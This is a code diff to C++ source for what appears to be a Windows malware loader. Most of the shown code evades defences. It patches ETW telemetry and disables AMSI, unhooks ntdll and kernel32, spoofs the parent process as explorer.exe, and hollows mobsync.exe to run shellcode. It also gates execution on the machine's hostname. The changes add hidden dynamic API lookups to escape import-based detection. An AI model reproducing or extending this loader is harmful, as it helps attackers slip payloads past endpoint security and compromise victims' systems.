@@ -5,6 +5,7 @@
 #include <vector>
 #include "aes.hpp"
 #include "base64.h"
+#include "helpers.h"
 #include "low.h"
 #include <string>
 #include <map>
@@ -13,6 +14,16 @@
 
 typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
+typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
+typedef HANDLE(WINAPI* GetCurrentProcess_t)();
+typedef HANDLE(WINAPI* GetProcessHeap_t)();
+typedef BOOL(WINAPI* Process32Next_t)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL(WINAPI* Process32First_t)(HANDLE, LPPROCESSENTRY32);
+typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
+typedef HANDLE(WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL(WINAPI* CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef BOOL(WINAPI* GetComputerNameA_t)(LPSTR, LPDWORD);
 typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
 VirtualProtect_t VirtualProtect_p = NULL;
@@ -56,15 +67,19 @@ string translate_morse(string morsed)
 
 // This is just directly stolen from ired.team
 DWORD get_PPID() {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    Process32First_t Process32First_p = (Process32First_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"Process32First");
+    Process32Next_t Process32Next_p = (Process32Next_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"Process32Next");
+    CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot_p = (CreateToolhelp32Snapshot_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"CreateToolhelp32Snapshot");
+
+    HANDLE snapshot = CreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 process = { 0 };
     process.dwSize = sizeof(process);
 
-    if (Process32First(snapshot, &process)) {
+    if (Process32First_p(snapshot, &process)) {
         do {
             if (!wcscmp(process.szExeFile, L"explorer.exe"))
                 break;
-        } while (Process32Next(snapshot, &process));
+        } while (Process32Next_p(snapshot, &process));
     }
 
     CloseHandle(snapshot);
@@ -113,9 +128,10 @@ void patchAMSIOpenSession(OUT HANDLE& hProc) {
 
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
 void patchETW(OUT HANDLE& hProc) {
-    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
+    //LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
     LPSTR l = const_cast<char*>(translate_morse("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
-    void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);
+    //void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);
+    void* etwAddr = hlpGetProcAddress(hlpGetModuleHandle(L"ntdll.dll"), l);
 
     char etwPatch[] = { 0xC3 };
 
@@ -148,7 +164,8 @@ void howlow_sc(std::vector<byte> recovered)
     si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
     si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
     InitializeProcThreadAttributeList(NULL, 2, 0, &size);
-    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+    GetProcessHeap_t GetProcessHeap_p = (GetProcessHeap_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"GetProcessHeap");
+    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap_p(), 0, size);
 
     // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
 InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
@@ -156,12 +173,14 @@ DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES
 UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
 
 // Mask the PPID to that of explorer.exe
-HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
+OpenProcess_t OpenProcess_p = (OpenProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"OpenProcess");
+HANDLE explorer_handle = OpenProcess_p(PROCESS_ALL_ACCESS, false, get_PPID());
 UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);
 
 LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";
 
-if (!CreateProcess(
+CreateProcessW_t CreateProcessW_p = (CreateProcessW_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"CreateProcessW");
+if (!CreateProcessW_p(
     hollow_bin,			// LPCWSTR Command (Binary to Execute)
     NULL,				// Command line
     NULL,				// Process handle not inheritable
@@ -179,7 +198,8 @@ if (!CreateProcess(
     std::cout << "whoops " << errval << std::endl;
 }
 
-WaitForSingleObject(pi.hProcess, 1400);
+WaitForSingleObject_t WaitForSingleObject_p = (WaitForSingleObject_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"WaitForSingleObject");
+WaitForSingleObject_p(pi.hProcess, 1400);
 hProcess = pi.hProcess;
 hThread = pi.hThread;
 
@@ -301,24 +321,25 @@ static int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
 }
 
 //code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
-void FreshCopy(unsigned char* sKernel32, unsigned char* modulePath, unsigned char* moduleName) {
-    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
-    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
-    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
-    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+void FreshCopy(LPCWSTR lKernel32, unsigned char* modulePath, LPCWSTR moduleName) {
+    char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
+    char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
+    char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
+    char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
 
     int ret = 0;
     HANDLE hFile;
     HANDLE hFileMapping;
     LPVOID pMapping;
 
-    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
-    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
-    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
-    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);
+    CreateFileA_t CreateFileA_p = (CreateFileA_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), (char*)"CreateFileA");
+    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), (char*)sCreateFileMappingA);
+    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(hlpGetModuleHandle(lKernel32), sMapViewOfFile);
+    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(hlpGetModuleHandle(lKernel32), sUnmapViewOfFile);
+    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(hlpGetModuleHandle(lKernel32), sVirtualProtect);
 
     // open the DLL
-    hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    hFile = CreateFileA_p((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         // failed to open the DLL
         printf("%u", GetLastError());
@@ -343,7 +364,7 @@ void FreshCopy(unsigned char* sKernel32, unsigned char* modulePath, unsigned cha
     }
 
     // remove hooks
-    ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);
+    ret = UnhookModule(hlpGetModuleHandle(moduleName), pMapping);
 
     // Clean up.
     UnmapViewOfFile_p(pMapping);
@@ -354,7 +375,8 @@ void FreshCopy(unsigned char* sKernel32, unsigned char* modulePath, unsigned cha
 int main()
 {
     //unhook all dlls
-    HANDLE process = GetCurrentProcess();
+    GetCurrentProcess_t GetCurrentProcess_p = (GetCurrentProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"GetCurrentProcess");
+    HANDLE process = GetCurrentProcess_p();
     //char fullModulePath[21];
     //char modulePath[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
     //memcpy(fullModulePath, modulePath, strlen(modulePath));
@@ -365,10 +387,12 @@ int main()
     unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
     unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };
     unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+    LPCWSTR lKernel32 = L"KERNEL32.dll";
+    LPCWSTR lNtdll = L"ntdll.dll";
     unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
 
-    FreshCopy(sKernel32, sNtdllPath, sNtdll);
-    FreshCopy(sKernel32, sKernel32Path, sKernel32);
+    FreshCopy(lKernel32, sNtdllPath, lNtdll);
+    FreshCopy(lKernel32, sKernel32Path, lKernel32);
 
     // Disallow non-MSFT signed DLL's from injecting
     PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
@@ -396,7 +420,8 @@ int main()
     string strHostname;
     char name[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(name);
-    GetComputerNameA(name, &size);
+    GetComputerNameA_t GetComputerNameA_p = (GetComputerNameA_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"GetComputerNameA");
+    GetComputerNameA_p(name, &size);
 
     for (char character : name) strHostname.push_back(character);
     if (strHostname.find("CHANGESTRINGHERE") != std::string::npos) {
